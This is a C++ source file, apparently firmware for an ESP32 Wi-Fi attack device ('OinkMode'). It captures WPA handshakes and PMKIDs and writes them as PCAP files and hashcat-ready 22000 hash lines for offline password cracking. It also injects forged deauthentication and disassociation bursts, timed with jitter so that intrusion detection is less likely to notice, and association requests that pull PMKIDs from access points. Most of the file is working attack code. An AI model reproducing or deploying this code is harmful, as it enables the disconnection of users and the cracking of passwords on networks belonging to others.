int OinkMode::findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station) {
    // CALLBACK VERSION: Lookup only, no push_back
    // If not found, returns -1 and caller must queue to pendingHandshakeCreate
    NetworkRecon::enterCritical();
    int result = -1;
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            result = i;
            break;
        }
    }
    NetworkRecon::exitCritical();
    return result;  // -1 means caller must queue for creation in main thread
}

int OinkMode::findOrCreatePMKID(const uint8_t* bssid, const uint8_t* station) {
    // CALLBACK VERSION: Lookup only, no push_back
    // If not found, returns -1 and caller must queue to pendingPMKIDCreate
    NetworkRecon::enterCritical();
    int result = -1;
    for (int i = 0; i < (int)pmkids.size(); i++) {
        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
            memcmp(pmkids[i].station, station, 6) == 0) {
            result = i;
            break;
        }
    }
    NetworkRecon::exitCritical();
    return result;  // -1 means caller must queue for creation in main thread
}

// Safe versions for main thread use (does vector operations safely)
int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* station) {
    // This version is ONLY called from update() in main loop context
    // Still need spinlock to prevent race with callback reads
    
    NetworkRecon::enterCritical();
    
    // Look for existing
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            NetworkRecon::exitCritical();
            return i;
        }
    }

    const size_t sizeNow = handshakes.size();
    const size_t capNow = handshakes.capacity();
    const HeapPressureLevel pressure = HeapHealth::getPressureLevel();
    const bool needGrow = sizeNow >= capNow;

    // Only query heap metrics when we'd allocate/grow (keeps hot path allocation-free when capacity is available).
    const size_t freeHeap = needGrow ? ESP.getFreeHeap() : 0;
    const size_t largestBlock = needGrow ? heap_caps_get_largest_free_block(MALLOC_CAP_8BIT) : 0;

    const OinkCaptureFilters::HandshakeCreateGateResult gate =
        OinkCaptureFilters::evaluateHandshakeCreateGate(sizeNow, capNow, MAX_HANDSHAKES,
                                                        pressure,
                                                        freeHeap, HeapPolicy::kMinHeapForHandshakeAdd,
                                                        largestBlock, HANDSHAKE_ALLOC_MIN_BLOCK);

    if (!gate.allowCreate) {
        switch (gate.blockReason) {
            case OinkCaptureFilters::HandshakeCreateBlockReason::MaxHandshakes:
                hsCreateBlockedCap++;
                break;
            case OinkCaptureFilters::HandshakeCreateBlockReason::Pressure:
                hsCreateBlockedPressure++;
                break;
            case OinkCaptureFilters::HandshakeCreateBlockReason::FreeHeap:
                hsCreateBlockedFree++;
                break;
            case OinkCaptureFilters::HandshakeCreateBlockReason::Fragmentation:
                hsCreateBlockedFrag++;
                break;
            case OinkCaptureFilters::HandshakeCreateBlockReason::None:
            default:
                break;
        }
        NetworkRecon::exitCritical();
        return -1;
    }
    
    // Create new entry
    CapturedHandshake hs = {0};
    memcpy(hs.bssid, bssid, 6);
    memcpy(hs.station, station, 6);
    hs.capturedMask = 0;
    hs.firstSeen = millis();
    hs.lastSeen = millis();
    hs.saved = false;
    hs.saveAttempts = 0;  // Start with no attempts
    hs.beaconData = nullptr;
    hs.beaconLen = 0;
    
    // Attach beacon if available
    if (gate.allowBeaconCopy && beaconCaptured && beaconFrame && beaconFrameLen > 0 && beaconFrameLen <= MAX_BEACON_SIZE) {
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, bssid, 6) == 0) {
            size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
            if (largest >= beaconFrameLen) {
                hs.beaconData = (uint8_t*)malloc(beaconFrameLen);
                if (hs.beaconData) {
                    memcpy(hs.beaconData, beaconFrame, beaconFrameLen);
                    hs.beaconLen = beaconFrameLen;
                }
            }
        }
    }
    
    try {
        handshakes.push_back(hs);
    } catch (const std::bad_alloc&) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
        NetworkRecon::exitCritical();
        SDLog::log("OINK", "Failed to create handshake: out of memory");
        return -1;
    }
    int idx = handshakes.size() - 1;
    NetworkRecon::exitCritical();
    return idx;
}

int OinkMode::findOrCreatePMKIDSafe(const uint8_t* bssid, const uint8_t* station) {
    // This version is ONLY called from update() in main loop context
    // Still need spinlock to prevent race with callback reads
    
    NetworkRecon::enterCritical();
    
    // Look for existing
    for (int i = 0; i < (int)pmkids.size(); i++) {
        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
            memcmp(pmkids[i].station, station, 6) == 0) {
            NetworkRecon::exitCritical();
            return i;
        }
    }
    
    // Limit check
    if (pmkids.size() >= MAX_PMKIDS) {
        NetworkRecon::exitCritical();
        return -1;
    }
    // Pressure gate: block new PMKIDs at Warning+ (aggressive shedding)
    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) {
        NetworkRecon::exitCritical();
        return -1;
    }
    if (pmkids.size() >= pmkids.capacity()) {
        size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
        if (largest < PMKID_ALLOC_MIN_BLOCK) {
            NetworkRecon::exitCritical();
            return -1;
        }
    }
    
    // Create new entry
    CapturedPMKID p = {0};
    memcpy(p.bssid, bssid, 6);
    memcpy(p.station, station, 6);
    p.timestamp = millis();
    p.saved = false;
    p.saveAttempts = 0;  // Start with no attempts
    
    try {
        pmkids.push_back(p);
    } catch (const std::bad_alloc&) {
        NetworkRecon::exitCritical();
        SDLog::log("OINK", "Failed to create PMKID: out of memory");
        return -1;
    }
    int idx = pmkids.size() - 1;
    NetworkRecon::exitCritical();
    return idx;
}

uint16_t OinkMode::getCompleteHandshakeCount() {
    uint16_t count = 0;
    for (const auto& hs : handshakes) {
        if (hs.isComplete()) count++;
    }
    return count;
}

// LOCKING state queries for display
bool OinkMode::isLocking() {
    return running && autoState == AutoState::LOCKING;
}

const char* OinkMode::getTargetSSID() {
    return targetCacheValid ? targetSSIDCache : "";
}

uint8_t OinkMode::getTargetClientCount() {
    return targetCacheValid ? targetClientCountCache : 0;
}

const uint8_t* OinkMode::getTargetBSSID() {
    return targetCacheValid ? targetBssidCache : nullptr;
}

bool OinkMode::isTargetHidden() {
    return targetCacheValid ? targetHiddenCache : false;
}

void OinkMode::autoSaveCheck() {
    // Check if SD card is available
    if (!Config::isSDAvailable()) {
        return;
    }
    
    // Check if there's anything to save before pausing promiscuous
    bool hasUnsavedHS = false;
    bool hasUnsavedPMKID = false;
    
    for (const auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved && hs.saveAttempts < 3) {
            hasUnsavedHS = true;
            break;
        }
    }
    for (const auto& p : pmkids) {
        if (!p.saved && p.ssid[0] != 0) {
            hasUnsavedPMKID = true;
            break;
        }
    }
    
    if (!hasUnsavedHS && !hasUnsavedPMKID) {
        return;  // Nothing to save, skip promiscuous pause
    }
    
    // Pause promiscuous mode for safe SD access (avoids SPI bus contention)
    // Brief ~50-100ms gap is acceptable - we just captured what we needed
    bool pausedByUs = false;
    if (NetworkRecon::isRunning()) {
        NetworkRecon::pause();
        pausedByUs = true;
    }
    delay(5);  // Let SPI bus settle
    
    // Save any unsaved complete handshakes
    for (auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved && hs.saveAttempts < 3) {
            // Check backoff timer (exponential: 0s, 2s, 5s, then give up)
            static const uint32_t backoffMs[] = {0, 2000, 5000};
            uint32_t timeSinceCapture = millis() - hs.lastSeen;
            if (timeSinceCapture < backoffMs[hs.saveAttempts]) {
                continue;  // Wait for backoff period
            }
            
            const char* handshakesDir = SDLayout::handshakesDir();

            // Generate filename: SSID_BSSID.pcap
            char filename[64];
            SDLayout::buildCaptureFilename(filename, sizeof(filename),
                                           handshakesDir, hs.ssid, hs.bssid, ".pcap");
            
            // Ensure directory exists
            if (!SD.exists(handshakesDir)) {
                if (!SD.mkdir(handshakesDir)) {
                    SDLog::log("OINK", "Failed to create handshakes directory");
                    continue;  // Skip this handshake if we can't create directory
                }
            }
            
            // Save PCAP (for wireshark/manual analysis)
            bool pcapOk = saveHandshakePCAP(hs, filename);
            
            // Save 22000 format (hashcat-ready, no conversion needed)
            char filename22000[64];
            SDLayout::buildCaptureFilename(filename22000, sizeof(filename22000),
                                           handshakesDir, hs.ssid, hs.bssid, "_hs.22000");
            bool hs22kOk = saveHandshake22000(hs, filename22000);
            
            if (pcapOk || hs22kOk) {
                hs.saved = true;
                SDLog::log("OINK", "Handshake saved: %s (pcap:%s 22000:%s)",
                           hs.ssid, pcapOk ? "OK" : "FAIL", hs22kOk ? "OK" : "FAIL");
            } else {
                // Failed - increment attempt counter
                hs.saveAttempts++;
                if (hs.saveAttempts >= 3) {
                    // Give up after 3 attempts to prevent infinite retry
                    SDLog::log("OINK", "Save failed after 3 attempts: %s (kept in RAM)", hs.ssid);
                    hs.saved = true;  // Mark as done to stop retries (data still in RAM)
                }
            }
            
            // Yield to watchdog/scheduler after each save (prevents WDT during mass saves)
            delay(1);
        }
    }
    
    // Also save any unsaved PMKIDs
    saveAllPMKIDs();
    
    // Resume promiscuous mode if we paused it
    if (pausedByUs) {
        NetworkRecon::resume();
    }
}

// PCAP file format structures
#pragma pack(push, 1)
struct PCAPHeader {
    uint32_t magic;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t linktype;
};

struct PCAPPacketHeader {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};
#pragma pack(pop)

void OinkMode::writePCAPHeader(fs::File& f) {
    PCAPHeader hdr = {
        .magic = 0xA1B2C3D4,      // PCAP magic
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 65535,
        .linktype = 127           // LINKTYPE_IEEE802_11_RADIOTAP (with radiotap header)
    };
    f.write((uint8_t*)&hdr, sizeof(hdr));
}

// Minimal radiotap header (8 bytes) - no optional fields
static const uint8_t RADIOTAP_HEADER[] = {
    0x00,       // Header revision
    0x00,       // Header pad
    0x08, 0x00, // Header length (8, little-endian)
    0x00, 0x00, 0x00, 0x00  // Present flags (no optional fields)
};

void OinkMode::writePCAPPacket(fs::File& f, const uint8_t* data, uint16_t len, uint32_t ts) {
    // Total packet length = radiotap header + 802.11 frame
    uint32_t totalLen = sizeof(RADIOTAP_HEADER) + len;
    
    PCAPPacketHeader pkt = {
        .ts_sec = ts / 1000,
        .ts_usec = (ts % 1000) * 1000,
        .incl_len = totalLen,
        .orig_len = totalLen
    };
    f.write((uint8_t*)&pkt, sizeof(pkt));
    
    // Write radiotap header
    f.write(RADIOTAP_HEADER, sizeof(RADIOTAP_HEADER));
    
    // Write 802.11 frame data
    f.write(data, len);
}

bool OinkMode::saveHandshakePCAP(const CapturedHandshake& hs, const char* path) {
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    
    writePCAPHeader(f);
    
    int packetCount = 0;
    
    // Write beacon frame first (required for hashcat to crack)
    // Try per-handshake beacon first, fall back to global
    if (hs.hasBeacon()) {
        writePCAPPacket(f, hs.beaconData, hs.beaconLen, hs.firstSeen);
        packetCount++;
    } else if (beaconCaptured && beaconFrame && beaconFrameLen > 0) {
        // Verify global beacon is from same BSSID as handshake
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, hs.bssid, 6) == 0) {
            writePCAPPacket(f, beaconFrame, beaconFrameLen, hs.firstSeen);
            packetCount++;
        }
    }
    
    // Write EAPOL frames to PCAP
    for (int i = 0; i < 4; i++) {
        if (!(hs.capturedMask & (1 << i))) continue;
        
        const EAPOLFrame& frame = hs.frames[i];
        if (frame.len == 0) continue;
        
        // Prefer stored fullFrame (real 802.11 capture) over reconstruction
        if (frame.fullFrameLen > 0 && frame.fullFrameLen <= 300) {
            // Use the actual captured 802.11 frame (best quality)
            writePCAPPacket(f, frame.fullFrame, frame.fullFrameLen, frame.timestamp);
            packetCount++;
        } else {
            // Fallback: reconstruct frame from EAPOL payload (legacy path)
            uint8_t pkt[600];
            uint16_t pktLen = 0;
            
            // 802.11 Data frame header (24 bytes)
            pkt[0] = 0x08;
            pkt[2] = 0x00; pkt[3] = 0x00;  // Duration
            
            // Addresses depend on message direction
            if (i == 0 || i == 2) {  // M1, M3: AP->Station (FromDS=1, ToDS=0)
                pkt[1] = 0x02;
                memcpy(pkt + 4, hs.station, 6);
                memcpy(pkt + 10, hs.bssid, 6);
                memcpy(pkt + 16, hs.bssid, 6);
            } else {  // M2, M4: Station->AP (ToDS=1, FromDS=0)
                pkt[1] = 0x01;
                memcpy(pkt + 4, hs.bssid, 6);
                memcpy(pkt + 10, hs.station, 6);
                memcpy(pkt + 16, hs.bssid, 6);
            }
            
            pkt[22] = 0x00; pkt[23] = 0x00;  // Sequence
            pktLen = 24;
            
            // LLC/SNAP header (8 bytes)
            pkt[24] = 0xAA; pkt[25] = 0xAA; pkt[26] = 0x03;
            pkt[27] = 0x00; pkt[28] = 0x00; pkt[29] = 0x00;
            pkt[30] = 0x88; pkt[31] = 0x8E;
            pktLen = 32;
            
            // EAPOL data
            if (32 + frame.len > sizeof(pkt)) continue;
            memcpy(pkt + 32, frame.data, frame.len);
            pktLen += frame.len;
            
            writePCAPPacket(f, pkt, pktLen, frame.timestamp);
            packetCount++;
        }
    }
    
    f.close();
    return true;
}

bool OinkMode::saveAllHandshakes() {
    bool success = true;
    autoSaveCheck();  // This saves any unsaved ones
    return success;
}

bool OinkMode::savePMKID22000(const CapturedPMKID& p, const char* path) {
    // Save PMKID in hashcat 22000 format:
    // WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR
    
    // Safety check: don't save all-zero PMKIDs (invalid/empty)
    bool allZeros = true;
    for (int i = 0; i < 16; i++) {
        if (p.pmkid[i] != 0) { allZeros = false; break; }
    }
    if (allZeros) {
        return false;
    }
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    
    // Build the hash line
    // PMKID (16 bytes as 32 hex chars)
    char pmkidHex[33];
    for (int i = 0; i < 16; i++) {
        sprintf(pmkidHex + i*2, "%02x", p.pmkid[i]);
    }
    
    // MAC_AP (6 bytes as 12 hex chars, no colons)
    char macAP[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            p.bssid[0], p.bssid[1], p.bssid[2], 
            p.bssid[3], p.bssid[4], p.bssid[5]);
    
    // MAC_CLIENT (6 bytes as 12 hex chars)
    char macClient[13];
    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
            p.station[0], p.station[1], p.station[2], 
            p.station[3], p.station[4], p.station[5]);
    
    // ESSID (hex-encoded, max 32 chars = 64 hex + null)
    char essidHex[65];
    int ssidLen = strlen(p.ssid);
    if (ssidLen > 32) ssidLen = 32;  // Cap to max SSID length
    for (int i = 0; i < ssidLen; i++) {
        sprintf(essidHex + i*2, "%02x", (uint8_t)p.ssid[i]);
    }
    essidHex[ssidLen * 2] = 0;
    
    // Write: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***01
    // MESSAGEPAIR 01 = PMKID taken from AP
    f.printf("WPA*01*%s*%s*%s*%s***01\n", pmkidHex, macAP, macClient, essidHex);
    
    f.close();
    return true;
}

bool OinkMode::saveHandshake22000(const CapturedHandshake& hs, const char* path) {
    // Save handshake in hashcat 22000 format:
    // WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*EAPOL_CLIENT*MESSAGEPAIR
    //
    // Supported message pairs:
    // - 0x00: M1+M2 (ANonce from M1, EAPOL+MIC from M2) - most common
    // - 0x02: M2+M3 (ANonce from M3, EAPOL+MIC from M2) - fallback
    
    uint8_t msgPair = hs.getMessagePair();
    if (msgPair == 0xFF) {
        return false;
    }
    
    // Determine which frames to use
    const EAPOLFrame* nonceFrame = nullptr;  // M1 or M3 (contains ANonce)
    const EAPOLFrame* eapolFrame = nullptr;  // M2 (contains MIC + full EAPOL)
    
    if (msgPair == 0x00) {
        // M1+M2: ANonce from M1, EAPOL from M2
        nonceFrame = &hs.frames[0];  // M1
        eapolFrame = &hs.frames[1];  // M2
    } else {
        // M2+M3: ANonce from M3, EAPOL from M2
        nonceFrame = &hs.frames[2];  // M3
        eapolFrame = &hs.frames[1];  // M2
    }
    
    // MIC field is at offset 81-96 (16 bytes), so we need len >= 97 to read it safely
    if (nonceFrame->len < 51 || eapolFrame->len < 97) {
        return false;
    }
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    
    // Extract MIC from M2 EAPOL frame (offset 81, 16 bytes)
    // EAPOL-Key: ver(1)+type(1)+len(2)+desc(1)+keyinfo(2)+keylen(2)+replay(8)+nonce(32)+iv(16)+rsc(8)+reserved(8)+MIC(16)
    // Offsets: 0-3=EAPOL hdr, 4=desc, 5-6=keyinfo, 7-8=keylen, 9-16=replay, 17-48=nonce, 49-64=iv, 65-72=rsc, 73-80=reserved, 81-96=MIC
    char micHex[33];
    for (int i = 0; i < 16; i++) {
        sprintf(micHex + i*2, "%02x", eapolFrame->data[81 + i]);
    }
    
    // MAC_AP (6 bytes as 12 hex chars)
    char macAP[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            hs.bssid[0], hs.bssid[1], hs.bssid[2],
            hs.bssid[3], hs.bssid[4], hs.bssid[5]);
    
    // MAC_CLIENT (6 bytes as 12 hex chars)
    char macClient[13];
    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
            hs.station[0], hs.station[1], hs.station[2],
            hs.station[3], hs.station[4], hs.station[5]);
    
    // ESSID (hex-encoded, max 32 chars = 64 hex + null)
    char essidHex[65];
    int ssidLen = strlen(hs.ssid);
    if (ssidLen > 32) ssidLen = 32;  // Cap to max SSID length
    for (int i = 0; i < ssidLen; i++) {
        sprintf(essidHex + i*2, "%02x", (uint8_t)hs.ssid[i]);
    }
    essidHex[ssidLen * 2] = 0;
    
    // ANonce from M1 or M3 (offset 17, 32 bytes)
    char nonceHex[65];
    for (int i = 0; i < 32; i++) {
        sprintf(nonceHex + i*2, "%02x", nonceFrame->data[17 + i]);
    }
    
    // Full EAPOL frame from M2 (hex-encoded)
    // The EAPOL frame length is in bytes 2-3 (big-endian) + 4 bytes header
    uint16_t eapolLen = (eapolFrame->data[2] << 8) | eapolFrame->data[3];
    eapolLen += 4;  // Add EAPOL header (version + type + length)
    if (eapolLen > eapolFrame->len) eapolLen = eapolFrame->len;
    
    // Allocate buffer for hex-encoded EAPOL (2 chars per byte)
    // Max EAPOL is 512 bytes = 1024 hex chars + null
    static char eapolHex[1025];
    if (eapolLen * 2 + 1 > sizeof(eapolHex)) {
        f.close();
        return false;
    }
    
    // Zero the MIC in EAPOL copy for hashcat (MIC at offset 81)
    // Work on a copy to avoid modifying original
    uint8_t eapolCopy[512];
    memcpy(eapolCopy, eapolFrame->data, eapolLen);
    memset(eapolCopy + 81, 0, 16);  // Zero MIC field
    
    for (int i = 0; i < eapolLen; i++) {
        sprintf(eapolHex + i*2, "%02x", eapolCopy[i]);
    }
    eapolHex[eapolLen * 2] = 0;
    
    // Write: WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*ANONCE*EAPOL*MESSAGEPAIR
    f.printf("WPA*02*%s*%s*%s*%s*%s*%s*%02x\n",
             micHex, macAP, macClient, essidHex, nonceHex, eapolHex, msgPair);
    
    f.close();
    
    return true;
}

bool OinkMode::saveAllPMKIDs() {
    if (!Config::isSDAvailable()) return false;
    
    const char* handshakesDir = SDLayout::handshakesDir();

    // Ensure directory exists
    if (!SD.exists(handshakesDir)) {
        if (!SD.mkdir(handshakesDir)) {
            SDLog::log("OINK", "Failed to create handshakes directory for PMKID");
            return false;
        }
    }
    
    bool success = true;
    for (auto& p : pmkids) {
        // SSID backfill: In passive mode (DO NO HAM), M1 frames may arrive before
        // beacon, so SSID lookup fails at capture time. Try again before saving.
        // SSID is REQUIRED for PMKID cracking - it's the salt for PBKDF2(passphrase, SSID).
        if (p.ssid[0] == 0) {
            for (const auto& net : networks()) {
                if (memcmp(net.bssid, p.bssid, 6) == 0 && net.ssid[0] != 0) {
                    strncpy(p.ssid, net.ssid, 32);
                    p.ssid[32] = 0;
                    break;
                }
            }
        }
        
        // SSID is required - PMK = PBKDF2(passphrase, SSID), so no SSID = uncrackable
        // Keep in memory for later retry if SSID is found
        if (!p.saved && p.ssid[0] != 0 && p.saveAttempts < 3) {
            // Skip invalid all-zero PMKIDs (don't count as attempt)
            bool allZeros = true;
            for (int i = 0; i < 16; i++) {
                if (p.pmkid[i] != 0) { allZeros = false; break; }
            }
            if (allZeros) {
                p.saved = true;
                continue;
            }

            // Check backoff timer (exponential: 0s, 2s, 5s, then give up)
            static const uint32_t backoffMs[] = {0, 2000, 5000};
            uint32_t timeSinceCapture = millis() - p.timestamp;
            if (timeSinceCapture < backoffMs[p.saveAttempts]) {
                continue;  // Wait for backoff period
            }
            
            // Use SSID_BSSID filename in /handshakes/
            char filename[64];
            SDLayout::buildCaptureFilename(filename, sizeof(filename),
                                           handshakesDir, p.ssid, p.bssid, ".22000");
            
            if (savePMKID22000(p, filename)) {
                p.saved = true;
                SDLog::log("OINK", "PMKID saved: %s", p.ssid);
            } else {
                // Failed - increment attempt counter
                p.saveAttempts++;
                if (p.saveAttempts >= 3) {
                    // Give up after 3 attempts to prevent infinite retry
                    SDLog::log("OINK", "PMKID save failed after 3 attempts: %s (kept in RAM)", p.ssid);
                    p.saved = true;  // Mark as done to stop retries (data still in RAM)
                }
                success = false;
            }
            
            // Yield to watchdog/scheduler after each save
            delay(1);
        }
    }
    return success;
}

void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Deauth frame structure
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth
        0x00, 0x00,  // Duration
        // Address 1 (Destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Address 2 (Source/BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Address 3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,  // Sequence
        0x07, 0x00   // Reason code
    };
    
    memcpy(deauthPacket + 4, station, 6);
    memcpy(deauthPacket + 10, bssid, 6);
    memcpy(deauthPacket + 16, bssid, 6);
    deauthPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
    // Send burst of deauth frames for more effective disconnection
    // Random jitter between frames makes it harder for WIDS to detect pattern
    // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t jitterMax = FlexesScreen::getDeauthJitterMax();
    
    // Mark session as having deauthed (for Silent Witness achievement tracking)
    SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
    sess.everDeauthed = true;
    
    for (uint8_t i = 0; i < count; i++) {
        // AP -> Client (pretend to be AP)
        sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
        
        // Random jitter 1-Nms between forward and reverse frames (buff-modified)
        delay(random(1, jitterMax + 1));
        
        // Client -> AP (pretend to be client) - bidirectional attack
        if (memcmp(station, broadcast, 6) != 0) {
            // Only if not broadcast - swap source/dest
            uint8_t reversePacket[26] = {
                0xC0, 0x00,  // Frame Control: Deauth
                0x00, 0x00,  // Duration
            };
            memcpy(reversePacket + 4, bssid, 6);     // To AP
            memcpy(reversePacket + 10, station, 6);  // From Client
            memcpy(reversePacket + 16, bssid, 6);    // BSSID
            reversePacket[22] = 0x00;
            reversePacket[23] = 0x00;
            reversePacket[24] = 1;  // Unspecified reason
            reversePacket[25] = 0x00;
            esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
            
            // Jitter between iterations (buff-modified)
            if (i < count - 1) {
                delay(random(1, jitterMax + 1));
            }
        }
    }
}

void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Disassociation frame - some clients respond better to this
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (0xA0 instead of 0xC0)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code (Disassociated because station leaving)
    };
    
    memcpy(disassocPacket + 4, station, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
}

void OinkMode::sendAuthenticationRequest(const uint8_t* bssid) {
    // 802.11 Authentication Request (Open System) — required before Association
    // Most APs silently drop Assoc Requests from unauthenticated STAs (IEEE 802.11 state machine)
    uint8_t authFrame[30] = {};
    authFrame[0] = 0xB0;  // Frame Control: Type=Management, Subtype=Authentication (0x0B)
    authFrame[1] = 0x00;
    // Duration
    authFrame[2] = 0x00;
    authFrame[3] = 0x00;
    // Address 1: Destination (AP BSSID)
    memcpy(authFrame + 4, bssid, 6);
    // Address 2: Source (our MAC)
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
    memcpy(authFrame + 10, ourMac, 6);
    // Address 3: BSSID
    memcpy(authFrame + 16, bssid, 6);
    // Sequence control
    authFrame[22] = 0x00;
    authFrame[23] = 0x00;
    // Auth body: Algorithm=Open System(0), Seq=1, Status=Success(0)
    authFrame[24] = 0x00; authFrame[25] = 0x00;  // Algorithm Number: Open System
    authFrame[26] = 0x01; authFrame[27] = 0x00;  // Authentication SEQ: 1
    authFrame[28] = 0x00; authFrame[29] = 0x00;  // Status Code: Success

    esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
}

void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
    // 802.11 Association Request for active PMKID extraction
    uint8_t assocReq[128];
    memset(assocReq, 0, sizeof(assocReq));
    
    // Frame Control: Type=Management(0), Subtype=Association Request(0)
    assocReq[0] = 0x00;
    assocReq[1] = 0x00;
    
    // Duration
    assocReq[2] = 0x00;
    assocReq[3] = 0x00;
    
    // Address 1: Destination (AP BSSID)
    memcpy(assocReq + 4, bssid, 6);
    
    // Address 2: Source (our MAC)
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
    memcpy(assocReq + 10, ourMac, 6);
    
    // Address 3: BSSID
    memcpy(assocReq + 16, bssid, 6);
    
    // Sequence control
    assocReq[22] = 0x00;
    assocReq[23] = 0x00;
    
    // Frame body starts at offset 24
    uint16_t bodyOffset = 24;
    
    // Capability Info: ESS + Short Preamble
    assocReq[bodyOffset++] = 0x01;
    assocReq[bodyOffset++] = 0x04;
    
    // Listen Interval
    assocReq[bodyOffset++] = 0x0A;
    assocReq[bodyOffset++] = 0x00;
    
    // SSID IE (Tag 0)
    assocReq[bodyOffset++] = 0x00;
    assocReq[bodyOffset++] = ssidLen;
    memcpy(assocReq + bodyOffset, ssid, ssidLen);
    bodyOffset += ssidLen;
    
    // Supported Rates IE (Tag 1)
    assocReq[bodyOffset++] = 0x01;
    assocReq[bodyOffset++] = 0x08;
    assocReq[bodyOffset++] = 0x82;  // 1 Mbps basic
    assocReq[bodyOffset++] = 0x84;  // 2 Mbps basic
    assocReq[bodyOffset++] = 0x8B;  // 5.5 Mbps basic
    assocReq[bodyOffset++] = 0x96;  // 11 Mbps basic
    assocReq[bodyOffset++] = 0x0C;  // 6 Mbps
    assocReq[bodyOffset++] = 0x12;  // 9 Mbps
    assocReq[bodyOffset++] = 0x18;  // 12 Mbps
    assocReq[bodyOffset++] = 0x24;  // 18 Mbps

    // RSN IE (Tag 0x30) - Required for AP to include PMKID in M1
    // Without RSN IE, most APs won't start 4-way handshake or omit PMKID.
    // Advertises WPA2-CCMP with PSK AKM, no PMF.
    assocReq[bodyOffset++] = 0x30;  // Tag: RSN Information
    assocReq[bodyOffset++] = 0x14;  // Length: 20 bytes
    assocReq[bodyOffset++] = 0x01;  // RSN Version 1
    assocReq[bodyOffset++] = 0x00;
    assocReq[bodyOffset++] = 0x00;  // Group Cipher Suite: 00-0F-AC (IEEE OUI)
    assocReq[bodyOffset++] = 0x0F;
    assocReq[bodyOffset++] = 0xAC;
    assocReq[bodyOffset++] = 0x04;  // CCMP-128
    assocReq[bodyOffset++] = 0x01;  // Pairwise Cipher Suite Count: 1
    assocReq[bodyOffset++] = 0x00;
    assocReq[bodyOffset++] = 0x00;  // Pairwise Cipher Suite: 00-0F-AC
    assocReq[bodyOffset++] = 0x0F;
    assocReq[bodyOffset++] = 0xAC;
    assocReq[bodyOffset++] = 0x04;  // CCMP-128
    assocReq[bodyOffset++] = 0x01;  // AKM Suite Count: 1
    assocReq[bodyOffset++] = 0x00;
    assocReq[bodyOffset++] = 0x00;  // AKM Suite: 00-0F-AC
    assocReq[bodyOffset++] = 0x0F;
    assocReq[bodyOffset++] = 0xAC;
    assocReq[bodyOffset++] = 0x02;  // PSK
    assocReq[bodyOffset++] = 0x00;  // RSN Capabilities: 0 (no PMF)
    assocReq[bodyOffset++] = 0x00;

    esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
}

void OinkMode::clearTargetClients() {
    NetworkRecon::enterCritical();
    targetClientCount = 0;
    targetClientCountCache = 0;
